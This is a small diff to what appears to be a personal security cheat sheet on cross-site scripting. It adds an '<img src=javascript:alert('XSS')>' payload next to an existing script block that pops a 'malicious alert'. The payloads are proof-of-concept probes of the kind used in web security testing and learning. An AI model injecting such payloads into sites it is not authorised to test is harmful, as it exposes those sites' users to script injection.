@@ -904,6 +904,7 @@ Database
 > payalod xss tosinks
 > xss common bypass alert()
 ```
+<img src=javascript:alert('XSS')>
 <script>
 confirm("This is a malicious alert");
 </script>
